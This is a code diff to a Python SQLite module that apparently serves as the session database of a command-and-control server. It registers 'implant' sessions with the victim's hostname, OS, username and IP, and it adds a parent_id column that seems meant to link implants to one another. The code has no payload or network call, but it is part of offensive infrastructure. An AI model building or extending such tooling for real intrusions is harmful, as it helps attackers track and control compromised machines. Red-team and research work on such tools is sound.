@@ -34,9 +34,14 @@ def init_db():
             ip TEXT,
             first_seen TEXT,
             last_seen TEXT,
-            status TEXT DEFAULT 'active'
+            status TEXT DEFAULT 'active',
+            parent_id TEXT
         )
     """)
+    try:
+        c.execute('ALTER TABLE sessions ADD COLUMN parent_id TEXT')
+    except sqlite3.OperationalError:
+        pass # Column exists
     c.execute("""
         CREATE TABLE IF NOT EXISTS commands (
             id INTEGER PRIMARY KEY AUTOINCREMENT,
@@ -53,15 +58,15 @@ def init_db():
     conn.close()
 
 
-def register(hostname, os_info, username, ip):
+def register(hostname, os_info, username, ip, parent_id=None):
     """Register a new implant session. Returns the session UUID."""
     conn = _get_conn()
     c = conn.cursor()
     session_id = str(uuid.uuid4())[:8]
     now = datetime.utcnow().isoformat()
     c.execute(
-        "INSERT INTO sessions (id, hostname, os, username, ip, first_seen, last_seen) VALUES (?,?,?,?,?,?,?)",
-        (session_id, hostname, os_info, username, ip, now, now)
+        "INSERT INTO sessions (id, hostname, os, username, ip, first_seen, last_seen, parent_id) VALUES (?,?,?,?,?,?,?,?)",
+        (session_id, hostname, os_info, username, ip, now, now, parent_id)
     )
     conn.commit()
     conn.close()
